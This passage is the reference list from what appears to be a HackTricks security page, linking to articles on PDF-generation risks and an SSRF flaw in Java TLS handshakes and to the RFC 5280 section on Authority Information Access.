- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [Tenable – SSRF Vulnerability in Java TLS Handshakes That Creates DoS Risk](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
- [RFC 5280 §4.2.2.1 Authority Information Access](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.2.1)

{{#include ../../banners/hacktricks-training.md}}
